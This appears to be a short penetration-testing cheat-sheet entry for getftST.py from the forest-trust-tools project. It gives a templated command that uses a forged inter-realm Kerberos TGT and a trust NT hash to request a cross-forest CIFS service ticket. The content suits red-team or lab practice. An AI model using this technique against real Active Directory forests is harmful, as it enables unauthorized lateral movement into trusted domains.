# getftST 

% impacket-kerberos, windows, kerberos, 88, delegation, TGS, trust

## source
```
https://github.com/dirkjanm/forest-trust-tools
```

## Request cross-forest TGS using a forged inter-realm TGT
edit file and put self.__nthash = '' with trust nthash
```
KRB5CCNAME=<inter-realm_TGT> getftST.py -spn "CIFS/<dc_name>.<dest_domain_fqdn>" -target-domain <dest_domain_fqdn> -via-domain <src_domain_fqdn> "client.offshore.com/bankvault" -dc-ip <dest_domain_fqdn>
```

